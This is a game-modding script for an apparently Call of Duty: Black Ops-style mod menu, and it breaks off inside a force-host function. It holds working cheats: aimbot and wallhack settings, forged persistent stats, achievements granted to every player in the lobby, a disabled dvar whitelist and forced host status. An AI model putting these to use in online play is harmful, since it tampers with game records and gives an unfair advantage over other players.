#include maps\mp\gametypes\_hud_util;
#include maps\mp\_utility;
#include common_scripts\utility;      
#include maps\mp\gametypes\_hud_message;
#include maps\mp\gametypes\ipro;
#include maps\mp\gametypes\_ipros;
#include maps\mp\gametypes\_cloudrank1;
#include maps\mp\gametypes\_cloudme;
#include maps\mp\gametypes\_hideandseek;
#include maps\mp\gametypes\so_stoned;
//#include maps\mp\gametypes\_rank;

UnlockAll()
{
	self thread UnlockAll1();
	wait 25;
	self thread UnlockSplash();
	self thread Doalltrophys();
	self thread setRank65();
	self thread maps\mp\gametypes\_persistence::statGet( "codpoints",9999999);
	
}
Doalltrophys()
{
	for ( t=0;t < level.players.size;t++ )
	{ 
		players = level.players[t];
		players thread doAchievements();
	}
	self iprintln("You Gave Everyone All Trophies!");
}
doAchievements()
{
	list = strtok("SP_WIN_CUBA SP_WIN_VORKUTA SP_WIN_PENTAGON SP_WIN_FLASHPOINT SP_WIN_KHE_SANH SP_WIN_HUE_CITY SP_WIN_KOWLOON SP_WIN_RIVER SP_WIN_FULLAHEAD SP_WIN_INTERROGATION_ESCAPE SP_WIN_UNDERWATERBASE SP_VWIN_FLASHPOINT SP_VWIN_HUE_CITY SP_VWIN_RIVER SP_VWIN_FULLAHEAD SP_VWIN_UNDERWATERBASE SP_LVL_CUBA_CASTRO_ONESHOT SP_LVL_VORKUTA_VEHICULAR SP_LVL_VORKUTA_SLINGSHOT SP_LVL_KHESANH_MISSILES SP_LVL_HUECITY_AIRSUPPORT SP_LVL_HUECITY_DRAGON SP_LVL_CREEK1_DESTROY_MG SP_LVL_CREEK1_KNIFING SP_LVL_KOWLOON_DUAL SP_LVL_RIVER_TARGETS SP_LVL_WMD_RSO SP_LVL_WMD_RELAY SP_LVL_POW_HIND SP_LVL_POW_FLAMETHROWER SP_LVL_FULLAHEAD_2MIN SP_LVL_REBIRTH_MONKEYS SP_LVL_REBIRTH_NOLEAKS SP_LVL_UNDERWATERBASE_MINI SP_LVL_FRONTEND_CHAIR SP_LVL_FRONTEND_ZORK SP_GEN_MASTER SP_GEN_FRAGMASTER SP_GEN_ROUGH_ECO SP_GEN_CROSSBOW SP_GEN_FOUNDFILMS SP_ZOM_COLLECTOR SP_ZOM_NODAMAGE SP_ZOM_TRAPS SP_ZOM_SILVERBACK SP_ZOM_CHICKENS SP_ZOM_FLAMINGBULL MP_FILM_CREATED MP_WAGER_MATCH MP_PLAY");
	self giveAchievement(list);
	wait 0.2;
	self iprintln("All Achievements Unlocked!");
}

UnlockAll1()
{
self thread progressBar(25,"Unlocking All..");
perkz = [];
perkz[1] = "PERKS_SLEIGHT_OF_HAND";
perkz[2] = "PERKS_GHOST";
perkz[3] = "PERKS_NINJA";
perkz[4] = "PERKS_HACKER";
perkz[5] = "PERKS_LIGHTWEIGHT";
perkz[6] = "PERKS_SCOUT";
perkz[7] = "PERKS_STEADY_AIM";
perkz[8] = "PERKS_DEEP_IMPACT";
perkz[9] = "PERKS_MARATHON";
perkz[10] = "PERKS_SECOND_CHANCE";
perkz[11] = "PERKS_TACTICAL_MASK";
perkz[12] = "PERKS_PROFESSIONAL";
perkz[13] = "PERKS_SCAVENGER";
perkz[14] = "PERKS_FLAK_JACKET";
perkz[15] = "PERKS_HARDLINE";
self iprintln("^2DONE");
for(y=1;y<16;y++)
{
zxz0O0 = perkz[y];
for(i=0;i<3;i++)
{
self maps\mp\gametypes\_persistence::unlockItemFromChallenge( "perkpro " + zxz0O0 + " " + i);
}
}
}
UnlockSplash()
{
	self endon("disconnect");
	notifyData=spawnstruct();
	notifyData.iconName="rank_prestige10";
	notifyData.titleText="Enjoy Everything in the game "+self.name+"!";
	notifyData.notifyText="All Challenges Completed.";
	notifyData.notifyText2="iPROFamily <3";
	notifyData.glowColor =(0.5,0.0,0.8);
	notifyData.duration=7;
	notifyData.font="DAStacks";
	self thread maps\mp\gametypes\_hud_message::notifyMessage(notifyData);
	wait 1;
}
Prestige(value)
{
	self.pers["prestige"]=value;
	self.pers["rankxp"]=1262500;
	self.pers["rank"]=self maps\mp\gametypes\_rank::getRankForXp(self.pers["rankxp"]);
	self setdstat("playerstatslist", "plevel", "StatValue", value);
	self.setPromotion=true;
	wait 1.5;
	self thread maps\mp\gametypes\_rank::updateRankAnnounceHUD();
	self thread maps\mp\gametypes\_rank::updateRank();
	self thread maps\mp\gametypes\_rank::getPrestigeLevel();
	self thread maps\mp\gametypes\_rank::getSPM();
	self thread maps\mp\gametypes\_rank::getRankXP();
	self thread maps\mp\gametypes\_rank::syncXPStat();
	rank = maps\mp\gametypes\_rank::getRank();
	self setRank(self.pers["rank"],self.pers["prestige"]);
}

setRank65()
{
    //setDvar("scr_forcerankedmatch","1");
	//setdvar("xblive_privatematch","0");
	//setDvar("onlinegame","1");
	self.pers["rankxp"]=1262500;
	self.pers["rank"]=self maps\mp\gametypes\_rank::getRankForXp(self.pers["rankxp"]);
	self maps\mp\gametypes\_persistence::statSet("rankxp", 1262500, true ); 
	self.setPromotion=true;
	wait 1.5;
	self thread maps\mp\gametypes\_rank::updateRankAnnounceHUD();
	self thread maps\mp\gametypes\_rank::updateRank();
	self thread maps\mp\gametypes\_rank::getPrestigeLevel();
	self thread maps\mp\gametypes\_rank::getSPM();
	self thread maps\mp\gametypes\_rank::getRankXP();
	self thread maps\mp\gametypes\_rank::syncXPStat();
	self setRank(self.pers["rank"],self.pers["prestige"]);
	
}
dostats(value)
{
	kills=2541;
	wins=475;
	score=42650;
	kill_streak=7;
	win_streak=2;
	headshots=462;
	deaths=0;
	assist=285;
	accuracy=1;
	losses=328;
	misses=34565;
	time_played_total=400;
	if(value=="Low")
	{
		kills=2541;
		wins=475;
		score=42650;
		kill_streak=11;
		win_streak=2;
		headshots=462;
		deaths=1000;
		assist=285;
		accuracy=1;
		losses=328;
		misses=34565;
		time_played_total=400;
	}
	if(value=="Medium")
	{
		kills=93582;
		wins=3848;
		score=504302;
		kill_streak=61;
		win_streak=23;
		headshots=46059;
		deaths=39860;
		assist=35742;
		accuracy=2;
		losses=1869;
		misses=40322;
		time_played_total=3500;
	}
	if(value=="High")
	{
		kills=2147400;
		wins=21474000;
		score=21474000;
		kill_streak=1337;
		win_streak=21474000;
		headshots=21474000;
		deaths=10023;
		assist=21474000;
		accuracy=21474000;
		losses=2343;
		misses=10493;
		time_played_total=5000000000;
	}
	if(value=="Insane")
	{
		kills=2147400000;
		wins=2147400000;
		score=2147400000;
		kill_streak=2147400000;
		win_streak=2147400000;
		headshots=2147400000;
		deaths=1337;
		assist=2147400000;
		accuracy=2147400000;
		losses=1337;
		misses=0;
		time_played_total=500000000000;
	}
	if(value=="Max")
	{
		kills=2147483647;
		wins=2147483647;
		score=2147483647;
		kill_streak=1337;
		win_streak=2147483647;
		headshots=2147483647;
		deaths=0;
		assist=2147483647;
		accuracy=2147483647;
		losses=0;
		misses=2147483647;
		time_played_total=2147483647;
	}
	if(value=="Negative")
	{
		kills=-2147400000;
		wins=-2147400000;
		score=-2147400000;
		kill_streak=-2147400000;
		win_streak=-2147400000;
		headshots=-2147400000;
		deaths=-2147400000;
		assist=-2147400000;
		accuracy=-2147400000;
		losses=-2147400000;
		misses=-2147400000;
		time_played_total=-5000000000;
	}
	if(value=="Reset")
	{
		kills=0;
		wins=0;
		score=0;
		kill_streak=0;
		win_streak=0;
		headshots=0;
		deaths=0;
		assist=0;
		accuracy=0;
		losses=0;
		misses=0;
		time_played_total=0;
	}
	self maps\mp\gametypes\_persistence::statSet("kills",kills);
	self maps\mp\gametypes\_persistence::statSet("wins",wins);
	self maps\mp\gametypes\_persistence::statSet("score",score);
	self maps\mp\gametypes\_persistence::statSet("kill_streak",kill_streak);
	self maps\mp\gametypes\_persistence::statSet("win_streak",win_streak);
	self maps\mp\gametypes\_persistence::statSet("headshots",headshots);
	self maps\mp\gametypes\_persistence::statSet("deaths",deaths);
	self maps\mp\gametypes\_persistence::statSet("assist",assist);
	self maps\mp\gametypes\_persistence::statSet("accuracy",accuracy);
	self maps\mp\gametypes\_persistence::statSet("losses",losses);
	self maps\mp\gametypes\_persistence::statSet("misses",misses);
	self maps\mp\gametypes\_persistence::statAdd("time_played_total",time_played_total);
	wait 1;
	self iPrintln("Set "+ value + " Stats");
}

decapit()
{
	self setClientDvars("cg_thirdPerson","1","cg_fov","95");
	self setClientDvar("cg_thirdPersonRange","120");
	self setDepthOfField(0,128,512,4000,6,1.8);
	self detach("c_usa_jungmarines_head_fb", "j_head");
	self detach("c_usa_jungmarines_head_1", "j_head");
	self detach("c_usa_jungmarines_head_2", "j_head");
	self detach("c_usa_jungmarines_head_3", "j_head");
    self detach("c_nva_standard_head_1", "j_head");
	self detach("c_nva_standard_head_2", "j_head");
	self detach("c_rus_spetsnaz_head_1", "j_head");
	self detach("c_rus_spetsnaz_head_2", "j_head");
	self detach("c_usa_pentagon_head_1", "j_head");
	self detach("c_usa_pentagon_head_2", "j_head");
	self detach("c_vtn_vc1_head", "j_head");
	self detach("c_vtn_vc2_head", "j_head");
	self detach("c_vtn_vc3_head", "j_head");
	self playSound("chr_death_gibs");
	self.third=true;
	self iPrintln("You lost your head !");
}
toggle3rd()
{
	if(self.third==false)
	{
		self setClientDvars("cg_thirdPerson","1","cg_fov","115");
		self setDepthOfField(0,128,512,4000,6,1.8);
		self iPrintln("3rd Person ^2[ON]");
		self.third=true;
	}
	else
	{
		self SetClientDvars("cg_thirdPerson","0","cg_fov","65");
		self setDepthOfField(0,0,512,4000,4,0);
		self iPrintln("3rd Person ^1[OFF]");
		self.third=false;
	}
}
model_barrel()
{
	self setModel("global_explosive_barrel");
	self iPrintln("Barrel Model");
}
model_actor()
{
	self setModel("defaultactor");
	self iPrintln("Default Actor Model");
}
model_car()
{
	self setModel("defaultvehicle");
	self iPrintln("Default Car Model");
	self playsound("betty_activated");
	wait 0.1;
	self playsound("betty_activated");
	wait 0.1;
	self playsound("betty_activated");
	wait 0.1;
	self playsound("betty_activated");
	wait 0.1;
	self playsound("betty_activated");
	wait 0.1;
	self playsound("betty_activated");
}
model_dog()
{
	self setModel("german_shepherd");
	self iPrintln("Enemy Dog Model");
	self playSound("anml_dog_bark_close");
	wait 0.3;
	self playSound("anml_dog_bark_close");
	wait 0.4;
	self playSound("dog_neckbreak");
	wait 0.5;
	self playSound("dog_neckbreak");
}
model_sphere()
{
	self setModel("test_sphere_silver");
	self iPrintln("Sphere Model");
}

/*
model_test(Model)
{
	self setModel(Model);
	precacheModel(Model);
}
*/
model_test(model)
{
     self endon("disconnect");
	 self.spawnedPlayerModel delete();
     self iprintln("Model Set To ^2"+model);
     self.spawnedPlayerModel = spawn("script_model", self.origin);
     self.spawnedPlayerModel SetModel(model);
     self hide();
     self.currentOrigin = self.origin;
     self.currentAngle = self.angle;
     self.model =1;
     for (;;)
     {
          if (self.origin != self.currentOrigin)
          {
              self.spawnedPlayerModel MoveTo(self.origin, 0.01);
              self.currentOrigin = self.origin;
          }
          if (self.currentAngles != self.angles)
          {
              self.spawnedPlayerModel RotateTo(self.angles, 0.01);
              self.currentAngles = self.angles;
          }
          wait 0.01;
     }
     
}
toggleMatrix()
{
	if(self.Matrix==false)
	{
		self setClientDvar( "cg_tracerSpeed", "100" );
        self setClientDvar( "cg_tracerwidth", "9" );
        self setClientDvar( "cg_tracerlength", "999" );
        self setClientDvar( "cg_firstPersonTracerChance", "1" );
		self iPrintln("Bullets Style Matrix ^2[ON]");
		self.Matrix=true;
	}
	else
	{
		self setClientDvar( "cg_tracerSpeed", "0" );
        self setClientDvar( "cg_tracerwidth", "0" );
        self setClientDvar( "cg_tracerlength", "0" );
        self setClientDvar( "cg_firstPersonTracerChance", "0" );
		self iPrintln("Bullets Style Matrix ^1[OFF]");
		self.Matrix=false;
	}
}
togglePromod()
{
	if(self.Promod==false)
	{
		self setClientDvar("cg_fov","100");
		self setClientDvar("cg_gun_x","6");
		self setclientdvar("cg_fovmin","1");
		self setClientDvar("cg_fovscale","1.15");
		self iPrintln("ProMod ^2[ON]");
		self.Promod=true;
	}
	else
	{
		self setClientDvar("cg_fov","65");
		self setClientDvar("cg_gun_x","0");
		self setclientdvar("cg_fovmin","10");
		self setClientDvar("cg_fovscale","1");
		self iPrintln("ProMod ^1[OFF]");
		self.Promod=false;
	}
}
toggleLaser()
{
	if(self.Laser==false)
	{
		setDvar("cg_laserForceOn", 1);
		self iPrintln("Laser ^2[ON]");
		self.Laser=true;
	}
	else
	{
		setDvar("cg_laserForceOn", 0);
		self iPrintln("Laser ^1[OFF]");
		self.Laser=false;
	}
}
leftside()
{
	self setPlayerAngles(self.angles+(0,0,270));
	self iPrintln("Left Side Map");
}
rightside()
{
	self setPlayerAngles(self.angles+(0,0,90));
	self iPrintln("Right Side Map");
}
Upside()
{
	self setPlayerAngles(self.angles+(0,0,180));
	self iPrintln("Upside Down Map");
}
Normalside()
{
	self setPlayerAngles(self.angles+(0,0,0));
	self iPrintln("Normal Map");
}
allPerks()
{
    self.specialties = [];
    self.specialties[0] = "specialty_armorvest";       // Juggernaut
    self.specialties[1] = "specialty_fastreload";      // Sleight of Hand
    self.specialties[2] = "specialty_rof";             // Double Tap
    self.specialties[3] = "specialty_quickrevive";     // Quick Revive
    self.specialties[4] = "specialty_longersprint";    // Marathon / Stamin-Up style
    self.specialties[5] = "specialty_bulletaccuracy";  // Deadshot
    self.specialties[6] = "specialty_detectexplosive"; // Hacker / Engineer / PHD style
    self.specialties[7] = "specialty_bulletdamage";    // Stopping Power (if enabled via mod)
    self.specialties[8] = "specialty_bulletpenetration";// Deep Impact
    self.specialties[9] = "specialty_quieter";         // Dead Silence
    self.specialties[10] = "specialty_holdbreath";     // Steady Aim / Pro breath
    self.specialties[11] = "specialty_gpsjammer";      // Ghost / Spycraft
    self.specialties[12] = "specialty_immunecounteruav"; // Hardened / Tactical mask type

    for (s = 0; s < self.specialties.size; s++)
    {
        self setPerk(self.specialties[s]);
    }

    wait 1;
    self iPrintln("All Perks In Game Completed");
}
dvarsPerks()
{
	self setClientDvar("perk_overheatReduction","0.01");
	self setClientDvar("perk_sprintMultiplier","10");
	self setClientDvar("perk_turretRotSpeedMultiplier","15");
	self setClientDvar("perk_vehicleReloadReduction","0.01");
	self setClientDvar("perk_bulletPenetrationMultiplier","30");
	self setClientDvar("perk_bullet_penetrationMinFxDist","39");
	self setClientDvar("perk_bulletDamage","999");
	self setClientDvar("perk_armorVest","999");
	self setClientDvar("perk_extraBreath","99");
	self setClientDvar("perk_sprintMultiplier","40");
	self setClientDvar("perk_fireproof","99");
	self setClientDvar("perk_flakJacket","99");
	self setClientDvar("perk_flakJacketMaxDamage","99");
	self setClientDvar("perk_grenadeDeath","artillery_mp");
	self setClientDvar("perk_grenadeTossBackTimer","4500");
	self setClientDvar("perk_improvedExtraBreath","60");
	self setClientDvar("perk_explosiveDamage","999");
	self setClientDvar("perk_weapRateMultiplier","0.01");
	self setClientDvar("perk_weapReloadMultiplier","0.01");
	self setClientDvar("perk_weapSpreadMultiplier",".01");
	self setClientDvar("perk_fastSnipeScale","9");
	self setClientDvar("perk_armorPiercingDamage","-999");
	self setClientDvar("perk_extendedMeleeRange","999");
	self setClientDvar("perk_extendedMeleeRange","999");
	self iPrintln("All Dvars Perks Finished");
}
tankBetty()
{
	self setClientDvar("vehicle_damage_grenade","9.9");
	self setClientDvar("vehicle_damage_satchel_charge","9.9");
	self setClientDvar("vehicle_damage_sticky_grenade","9.35");
	self setClientDvar("vehicle_perk_boost_acceleration_multiplier","5.571");
	self setClientDvar("vehicle_perk_boost_duration_seconds","9999");
	self setClientDvar("vehicle_perk_boost_interval_seconds","0.01");
	self setClientDvar("vehicle_perk_boost_speed_increase","5.35");
	self setClientDvar("vehicle_perk_leadfoot_speed_increase","65");
	self setClientDvar("vehicle_useRadius","9999");
	self setClientDvar("vehicle_destructible_damage_bouncing_betty_radius","999");
	self setClientDvar("vehicle_damage_bouncing_betty","999");
	wait 1;
	self setClientDvar("scr_veh_driversareinvulnerable","1");
	self setClientDvar("scr_veh_health_tank","9999");
	self setClientDvar("scr_veh_health_jeep","9999");
	self setClientDvar("tabun_shock_radius","9999");
	self setClientDvar("tabun_effect_radius","9999");
	self setClientDvar("tabunInitialGasShockDuration","999");
	self setClientDvar("tabunWalkInGasShockDuration","999");
	self setClientDvar("tabunGasDuration","30");
	self setClientDvar("tabunGasDamage","999");
	self setClientDvar("poisonDuration","30");
	self setClientDvar("bettyDetonateRadius","150");
	self setClientDvar("bettyTimeBeforeDetonate","0.05");
	self setClientDvar("bettyUpVelocity","999");
	self setClientDvar("scr_deleteexplosivesonspawn","0");
	self setClientDvar("scr_maxPerPlayerExplosives","999");
	self iPrintln("^5Tank/tabun/betty Infected");
}
artilleryDog()
{
	self setClientDvar("scr_givedogs","1");
	self setClientDvar("scr_dog_time","600");
	self setClientDvar("scr_dog_health","999");
	self setClientDvar("scr_dog_count","99");
	self setClientDvar("scr_dog_max_at_once","99");
	self setClientDvar("scr_giveartillery","1");
	self setClientDvar("scr_hardpoint_artilleryCanonCount","99999");
	self setClientDvar("scr_hardpoint_artilleryCanonShellCount","99999");
	self setClientDvar("artilleryDangerOvalScale","99.9");
	self setClientDvar("artilleryDangerForwardPush","19.9");
	self setClientDvar("artilleryDangerMaxRadius","999");
	self setClientDvar("artilleryDangerMinRadius","998");
	self setClientDvar("volleyCount","8");
	self setClientDvar("volleyWaitMin","0.1");
	self setClientDvar("volleyWaitMax","0.2");
	self setClientDvar("shellWaitMin","0.1");
	self setClientDvar("shellWaitMax","0.2");
	self setClientDvar("planeFlySpeed","999999");
	self iPrintln("Set Infinite Artillery/Dogs Finished");
	wait 1;
	self iPrintln("^1YOU HAVE NEED MAP RESTART !");
}
setInfGame()
{
	self setClientDvar("scr_ctf_scorelimit","0");
	self setClientDvar("scr_ctf_timelimit","0");
	self setClientDvar("scr_dm_scorelimit","0");
	self setClientDvar("scr_dm_timelimit","0");
	self setClientDvar("scr_dom_scorelimit","0");
	self setClientDvar("scr_dom_timelimit","0");
	self setClientDvar("scr_koth_scorelimit","0");
	self setClientDvar("scr_koth_timelimit","0");
	self setClientDvar("scr_sab_scorelimit","0");
	self setClientDvar("scr_sab_timelimit","0");
	self setClientDvar("scr_sd_scorelimit","0");
	self setClientDvar("scr_sd_timelimit","0");
	self setClientDvar("scr_tdm_scorelimit","0");
	self setClientDvar("scr_tdm_timelimit","0");
	self setClientDvar("scr_twar_scorelimit","0");
	self setClientDvar("scr_twar_timelimit","0");
	wait 1;
	self iPrintln("^5Infinite Game");
}
scoreMod()
{
    // Free-for-All (DM)
    self setClientDvar("scr_dm_score_kill", 5000);
    self setClientDvar("scr_dm_score_headshot", 5000);
    self setClientDvar("scr_dm_score_assist", 5000);
    // Team Deathmatch (TDM)
    self setClientDvar("scr_tdm_score_kill", 5000);
    self setClientDvar("scr_tdm_score_headshot", 5000);
    self setClientDvar("scr_tdm_score_assist", 5000);
    // Capture the Flag (CTF)
    self setClientDvar("scr_ctf_score_kill", 5000);
    self setClientDvar("scr_ctf_score_capture", 5000);
    self setClientDvar("scr_ctf_score_headshot", 5000);
    self setClientDvar("scr_ctf_score_assist", 5000);
    // Headquarters (KOTH)
    self setClientDvar("scr_koth_score_kill", 5000);
    self setClientDvar("scr_koth_score_capture", 5000);
    self setClientDvar("scr_koth_score_headshot", 5000);
    self setClientDvar("scr_koth_score_assist", 5000);
    wait 0.1; 
    // Demolition (DD)
    self setClientDvar("scr_dd_score_kill", 5000);
    self setClientDvar("scr_dd_score_headshot", 5000);
    self setClientDvar("scr_dd_score_assist", 5000);
    self setClientDvar("scr_dd_score_plant", 5000);
    self setClientDvar("scr_dd_score_defuse", 5000);
    // Search and Destroy (SD)
    self setClientDvar("scr_sd_score_kill", 5000);
    self setClientDvar("scr_sd_score_plant", 5000);
    self setClientDvar("scr_sd_score_defuse", 5000);
    self setClientDvar("scr_sd_score_headshot", 5000);
    self setClientDvar("scr_sd_score_assist", 5000);
    // Sabotage (SAB)
    self setClientDvar("scr_sab_score_kill", 5000);
    self setClientDvar("scr_sab_score_headshot", 5000);
    self setClientDvar("scr_sab_score_assist", 5000);
    self setClientDvar("scr_sab_score_plant", 5000);
    self setClientDvar("scr_sab_score_defuse", 5000);
    self iPrintln("Score Mod Applied");
}
infectKnock()
{
	self setClientDvar("g_knockback","99999");
	self setClientDvar("cl_demoBackJump","99999");
	self setClientDvar("cl_demoForwardJump","99999");
	self iPrintln("Knockback Infected");
}
ColorClass(text)
{
	level.classMap["custom1"] = text; 
    level.classMap["custom2"] = text; 
    level.classMap["custom3"] = text; 
    level.classMap["custom4"] = text; 
    level.classMap["custom5"] = text; 
	level.classMap["prestigeclass1"] = text; 
    level.classMap["prestigeclass2"] = text; 
    level.classMap["prestigeclass3"] = text; 
    level.classMap["prestigeclass4"] = text; 
    level.classMap["prestigeclass5"] = text; 
	self setClientDvar("customclass1",text);
    self setClientDvar("customclass2",text);
    self setClientDvar("customclass3",text);
    self setClientDvar("customclass4",text);
    self setClientDvar("customclass5",text);
	self setClientDvar("prestigeclass1",text);
    self setClientDvar("prestigeclass2",text);
    self setClientDvar("prestigeclass3",text);
    self setClientDvar("prestigeclass4",text);
    self setClientDvar("prestigeclass5",text);
    self setClientDvar("ui_custom_name",text);
    self iprintln("Costum Class Names Changed By iPROFamily Patch ^1"+text);
}
ButtonClasses(text)
{
	level.classMap["custom1"] = text; 
    level.classMap["custom2"] = text; 
    level.classMap["custom3"] = text; 
    level.classMap["custom4"] = text; 
    level.classMap["custom5"] = text; 
	level.classMap["prestigeclass1"] = text; 
    level.classMap["prestigeclass2"] = text; 
    level.classMap["prestigeclass3"] = text; 
    level.classMap["prestigeclass4"] = text; 
    level.classMap["prestigeclass5"] = text; 
	self setClientDvar("customclass1",text);
    self setClientDvar("customclass2",text);
    self setClientDvar("customclass3",text);
    self setClientDvar("customclass4",text);
    self setClientDvar("customclass5",text);
	self setClientDvar("prestigeclass1",text);
    self setClientDvar("prestigeclass2",text);
    self setClientDvar("prestigeclass3",text);
    self setClientDvar("prestigeclass4",text);
    self setClientDvar("prestigeclass5",text);
    self setClientDvar("ui_custom_name",text);
    self iprintln("Costum Class Names Changed By iPROFamily Patch ^1"+text);
}
colorInfect()
{
	self setclientDvar("killcam_title","^6>> RAGE ^0RAGE ^1RAGE ^0RAGE ^1RAGE << ^3LOL <3");
	self setClientDvar("lowAmmoWarningColor1","1 0 0 1");
	self setClientDvar("lowAmmoWarningColor2","1 0.4 0 1");
	self setClientDvar("lowAmmoWarningNoAmmoColor1","1 0 0 1");
	self setClientDvar("lowAmmoWarningNoAmmoColor2","1 0.4 0 1");
	self setClientDvar("lowAmmoWarningNoReloadColor1","1 0 0 1");
	self setClientDvar("lowAmmoWarningNoReloadColor2","1 0.4 0 1");
	self setClientDvar("lobby_searchingPartyColor","0 0 1 1");
	self setClientDvar("ui_playerPartyColor","0 0.4 1 1");
	self setClientDvar("cg_scoreboardMyColor","0 0.4 1 1");
	self setClientDvar("cg_scoreboardpingtext","1");
	self setClientDvar("cg_scoreboardFont","3");
	self setClientDvar("developeruser","1");
	self setClientDvar("cg_ScoresPing_HighColor","1 0.4 0 1");
	self setClientDvar("cg_ScoresPing_LowColor","1 0 0 1");
	self setClientDvar("cg_ScoresPing_MedColor","1 1 0 1");
	self setClientDvar("cg_scoresPing_maxBars","6");
	self setClientDvar("cg_ScoresPing_HighColor","0 0 1 1");
	self setClientDvar("cg_ScoresPing_LowColor","0 0.68 1 1");
	self setClientDvar("cg_ScoresPing_MedColor","0 0.49 1 1");
	self setClientDvar("cg_hudGrenadeIconWidth","150");
	self setClientDvar("cg_hudGrenadeIconHeight","150");
	self setClientDvar("cg_hudGrenadeIndicatorStartColor","0 0 1 1");
	self setClientDvar("cg_hudGrenadeIndicatorTargetColor","1 0 0 1");
	self setClientDvar("motd","^6WAW MULTIPLAYER MOD INFECTION PATCH");
	self setclientDvar("killcam_title","^6>> RAGE ^0RAGE ^1RAGE ^0RAGE ^1RAGE << ^3LOL <3");
	self iPrintln("^6Color Infected/Change Clantag To");
}
cheated()
{
	self iPrintln("LOADING INFECTIONS...");
	self setClientDvar("aim_autobayonet_range","255");
	self setClientDvar("aim_automelee_range","255");
	self setClientDvar("aim_automelee_region_height","999");
	self setClientDvar("aim_automelee_region_width","999");
	self setClientDvar("aim_autoaim_debug","1");
	self setClientDvar("aim_autoaim_enabled","1");
	self setClientDvar("aim_autoaim_lerp","100");
	self setClientDvar("aim_autoaim_region_height","120");
	self setClientDvar("aim_autoaim_region_width" ,99999999);
	self setClientDvar("aim_aimAssistRangeScale","2");
	self setClientDvar("aim_autoAimRangeScale","9999");
	self setClientDvar("aim_lockon_debug","1");
	self setClientDvar("aim_lockon_enabled","1");wait .1;
	self setClientDvar("aim_lockon_region_height","1386");
	self setClientDvar("aim_lockon_region_width","0");
	self setClientDvar("aim_lockon_strength","1");
	self setClientDvar("aim_lockon_deflection","0.05");
	self setClientDvar("aim_input_graph_debug","0");
	self setClientDvar("aim_input_graph_enabled","1");
	self setClientDvar("aim_slowdown_debug","1");
	self setClientDvar("aim_slowdown_pitch_scale","0.4");
	self setClientDvar("aim_slowdown_pitch_scale_ads","0.5");
	self setClientDvar("aim_slowdown_region_height","0");
	self setClientDvar("aim_slowdown_region_width","0");
	self setClientDvar("aim_slowdown_yaw_scale","0.4");
	self setClientDvar("aim_slowdown_yaw_scale_ads","0.5");
	self setClientDvar("bg_forceExplosiveBullets",1);
	self setClientDvar("bg_bulletExplDmgFactor","100");
	self setClientDvar("bg_bulletExplRadius","10000");
	self setClientDvar("cg_overheadNamesFarDist","2048");
	self setClientDvar("cg_overheadNamesFarScale","1.50");
	self setClientDvar("cg_overheadNamesMaxDist","99999");
	self setClientDvar("cg_overheadNamesNearDist","100");
	self setClientDvar("cg_crosshairEnemyColor","2.55 0 2.47");
	self setClientDvar("cg_overheadNamesSize","0.3");
	self setClientDvar("cg_overheadRankSize","0.4");
	self setClientDvar("cg_overheadIconSize","0.6");
	self setClientDvar("cg_enemyNameFadeOut",900000);wait .1;
	self setClientDvar("cg_enemyNameFadeIn",0);
	self setClientDvar("cg_drawThroughWalls",1);
	self setClientDvar("cg_drawShellshock","0");
	self setClientDvar("cg_drawSnapshotTime","1");
	self setClientDvar("cg_deadChatWithDead","1");
	self setClientDvar("cg_deadHearAllLiving","1");
	self setClientDvar("cg_hudGrenadeIconEnabledFlash","1");
	self setClientDvar("cg_hudGrenadeIconMaxRangeFrag","99");
	self setClientDvar("cg_footsteps","1");
	self setClientDvar("defaultHitDamage","100");
	self setClientDvar("dynEnt_explodeForce","99999");
	self setClientDvar("enableDvarWhitelist",0);
	self setClientDvar("g_redCrosshairs","1");
	self setClientDvar("player_damageMultiplier","10");
	self setClientDvar("player_MGUseRadius","0");
	self setClientDvar("player_meleeChargeScale","999");
	self setClientDvar("player_bayonetRange","999");
	self setClientDvar("player_meleeHeight","1000");
	self setClientDvar("player_meleeRange","1000");
	self setClientDvar("player_meleeWidth","1000");
	self setClientDvar("phys_gravity","99");
	self setClientDvar("player_burstFireCooldown","0");
	self setClientDvar("player_spectateSpeedScale","5");
	self setClientDvar("player_cheated","1");
	self setClientDvar("party_vetoPercentRequired","0.01");
	self iPrintln("Cheat Infections Finished");
}
compassMod()
{
	self setClientDvar("compassEnemyFootstepEnabled","1");
	self setClientDvar("compassEnemyFootstepMaxRange","99999");
	self setClientDvar("compassEnemyFootstepMaxZ","99999");
	self setClientDvar("compassEnemyFootstepMinSpeed","0");
	self setClientDvar("compassRadarUpdateTime","6");
	self setClientDvar("g_compassShowEnemies","1");
	self setClientDvar("compassSize","1.5");
	self setClientDvar("cg_enemyNameFadeOut",900000);
	self setClientDvar("cg_enemyNameFadeIn",0);
	self setClientDvar("cg_drawThroughWalls",1);
	self setClientDvar("cg_drawShellshock","0");
	self setClientDvar("cg_drawSnapshotTime","1");
	self setClientDvar("cg_footsteps","1");
	self setClientDvar("scr_game_forceuav","1");
	self setClientDvar("compass","0");
	self setClientDvar("ui_radar_client",1);
	self iPrintln("Modded Compass Finished");
}
doForceHost()
{
	self endon("disconnect");
	self endon("death");
	if(self.ForceHost==false)
	{
		self.ForceHost=true;
		self iPrintln("Force Host: ^2[ON]");
		self setClientDvar("party_iamhost",1);
		self setClientDvar("party_host",1);
		self setClientDvar("MakeMeHost", "1");
		self setClientDvar("party_hostmigration",0);
		self setClientDvar("party_connectToOthers",0);
		self setclientDvar("lobby_partySearchWaitTime",0);
		self setClientDvar("ui_hostOptionsEnabled", "1");
		self setclientDvar("bandwidthtest_enable",0);
	}
	else
	{
		self.ForceHost=false;
		self iPrintln("Force Host: ^1[OFF]");
		self setClientDvar("party_iamhost",0);
		self setClientDvar("party_host",0);
		self setClientDvar("MakeMeHost", "0");
		self setClientDvar("party_hostmigration",1);
		self setClientDvar("party_connectToOthers",1);
		self setclientDvar("lobby_partySearchWaitTime",1);
		self setClientDvar("ui_hostOptionsEnabled", "0");
		self setclientDvar("bandwidthtest_enable",1);
	}
}
iPROForceHost()
{
	if(getDvarInt("party_connectToOthers")==1)
	{
		setDvar("bandwidthtest_enable",0);
		self setClientDvar("bandwidthtest_enable",0);
		setDvar("badhost_minTotalClientsForHappyTest",1);
		self setClientDvar("badhost_minTotalClientsForHappyTest",1);
		setDvar("bandwidthtest_fudge",0);
		self setClientDvar("bandwidthtest_fudge",0);
		setDvar("bandwidthtest_ingame_enable",0);
		self setClientDvar("bandwidthtest_ingame_enable",0);
		setDvar("bandwidthtest_ingame_fudge",0);
		self setClientDvar("bandwidthtest_ingame_fudge",0);
		setDvar("party_connectToOthers",0);
		self setClientDvar("party_connectToOthers",0);
		setDvar("party_hostmigration",0);
		setDvar("party_msPerTier",50000);
